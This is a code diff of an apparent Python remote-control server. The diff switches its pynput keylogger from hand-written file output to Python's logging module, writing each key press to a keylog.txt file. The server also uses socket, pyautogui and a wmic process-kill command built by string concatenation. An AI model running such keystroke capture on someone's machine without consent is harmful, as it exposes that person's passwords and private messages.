@@ -1,10 +1,10 @@
-from concurrent.futures import thread
 import socket
 import threading
 import os
 import pyautogui
 import time
 import subprocess
+import logging
 from pynput import keyboard
 
 # Commands
@@ -26,8 +26,12 @@ FLAG_APPS_END = 'APPS_END'
 # BUFFER
 BUFFER_SIZE = 1024
 
-# SCREENSHOT
+# TMP
 TMP_PATH = os.path.join(os.getcwd(), 'server/tmp')
+
+#LOGGING
+LOG_DIR = r"./server/tmp/"
+logging.basicConfig(filename = (LOG_DIR+ "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
 class Server:
@@ -136,26 +140,27 @@ class Server:
     os.popen('wmic process where processid=' + pid + ' call terminate')
 
   def on_press(self, key):
-      with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
-      # Special charactersa
-        if key == keyboard.Key.enter:
-          key = '\n'
-        if key == keyboard.Key.space:
-          key = ' '
-        if key == keyboard.Key.tab:
-          key = '\t'
-        if key == keyboard.Key.shift:
-          key = '<shift>'
-        if key == keyboard.Key.backspace:
-          key = '<backspace>'
-        if key == keyboard.Key.esc:
-          key = '<esc>'
-        if key == keyboard.Key.ctrl:
-          key = '<ctrl>'
+    # with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
+    # # Special charactersa
+    #   if key == keyboard.Key.enter:
+    #     key = '\n'
+    #   if key == keyboard.Key.space:
+    #     key = ' '
+    #   if key == keyboard.Key.tab:
+    #     key = '\t'
+    #   if key == keyboard.Key.shift:
+    #     key = '<shift>'
+    #   if key == keyboard.Key.backspace:
+    #     key = '<backspace>'
+    #   if key == keyboard.Key.esc:
+    #     key = '<esc>'
+    #   if key == keyboard.Key.ctrl:
+    #     key = '<ctrl>'
 
-        key = str(key).replace("'", '')
+    #   key = str(key).replace("'", '')
 
-        f.write(str(key))
+    #   f.write(str(key))
+    logging.info(str(key))
 
   def start_keylogger(self):
     self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
